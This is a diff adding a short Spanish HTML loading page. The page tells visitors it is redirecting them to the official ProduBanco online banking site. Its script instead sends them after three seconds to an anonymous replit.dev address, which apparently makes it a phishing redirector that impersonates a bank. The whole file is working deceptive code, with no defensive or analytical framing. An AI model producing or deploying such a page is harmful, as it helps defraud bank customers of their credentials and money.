@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Pantalla de carga</title>
+
+  <!-- Google Fonts: Poppins -->
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
+
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background-color: 
+      #013b12;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      font-family: 'Poppins', sans-serif;
+      color: white;
+      user-select: none;
+    }
+
+    .loader-container {
+      text-align: center;
+    }
+
+    .loader-gif {
+      width: 350px;
+      height: auto;
+      margin-bottom: 5px;
+    }
+
+    .loader-text {
+      font-size: 20px;
+      font-weight: 600;
+      opacity: 0;
+      transform: scale(0.95);
+      animation: fadeZoomIn 1s ease forwards;
+    }
+
+    @keyframes fadeZoomIn {
+      to {
+        opacity: 1;
+        transform: scale(1);
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="loader-container">
+    <img src="https://linktr.ee/og/image/GraceChachalo.jpg" alt="Cargando..." class="loader-gif" />
+    <div class="loader-text">
+      Redirigiendo a la pagina oficial ProduBanco En Linea
+    </div>
+  </div>
+
+  <script>
+    setTimeout(() => {
+      window.location.href = 'https://14c4130d-e7e7-426f-baf1-34122bb82ec2-00-2p1ij7uwboopd.riker.replit.dev/';
+    },3000);
+  </script>
+</body>
+</html>
